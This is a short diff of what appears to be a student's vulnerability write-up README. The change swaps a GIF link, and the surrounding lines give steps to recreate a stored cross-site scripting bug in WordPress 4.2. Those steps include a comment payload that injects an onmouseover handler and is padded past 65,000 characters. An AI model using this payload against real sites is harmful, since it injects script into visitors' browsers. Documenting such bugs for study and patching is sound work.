@@ -16,7 +16,7 @@ Time spent: **30** hours spent in total
     4.2
     - Fixed in version: 
   - [ ] GIF Walkthrough: 
-  ![GIF](https://giphy.com/gifs/1mgnbgjGX5bsAR2c2R)
+  ![GIF](https://gph.is/2B9tDZt)
   - [ ] Steps to recreate: 
   >Enter a comment like the following: `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
   (It has to have more than 65,000 characters.)
